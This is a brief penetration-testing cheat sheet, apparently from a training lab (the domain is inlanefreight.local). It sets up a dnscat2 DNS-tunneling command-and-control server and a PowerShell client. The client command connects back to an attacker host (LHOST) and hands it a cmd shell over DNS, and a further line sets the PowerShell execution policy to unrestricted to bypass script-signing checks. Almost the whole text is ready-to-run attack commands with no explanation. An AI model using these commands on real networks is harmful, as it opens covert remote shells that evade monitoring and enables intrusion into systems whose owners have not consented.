# SETUP  
git clone https://github.com/iagox86/dnscat2.git  
  
```
cd dnscat2/server/  
sudo gem install bundler  
bundle install  
```
  
# Run  
```
sudo ruby dnscat2.rb --dns host=LHOST,port=53,domain=inlanefreight.local --no-cache  
```
  
## Powershell version  
```
git clone https://github.com/lukebaggett/dnscat2-powershell.git  
```
  
```powershell
powershell  
Import-Module .\dnscat2.ps1  
Start-Dnscat2 -DNSserver LHOST -Domain inlanefreight.local -PreSharedSecret 0x0 -Exec cmd
```  
  
## if issues with digital signatures  
```
set-executionpolicy unrestricted
```